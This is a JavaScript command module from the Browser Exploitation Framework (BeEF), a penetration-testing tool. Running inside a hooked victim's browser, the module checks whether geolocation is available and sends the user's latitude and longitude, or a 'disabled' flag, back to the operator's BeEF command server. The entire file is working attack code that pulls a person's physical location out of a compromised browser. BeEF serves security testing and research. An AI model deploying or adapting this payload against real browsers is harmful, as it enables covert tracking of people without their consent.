//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    if(!beef.geolocation.isGeolocationEnabled()){
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "geoLocEnabled=FALSE&latitude=&longitude=");
		return;
    }

    beef.geolocation.getGeolocation("<%= @command_url %>", <%= @command_id %>);

});

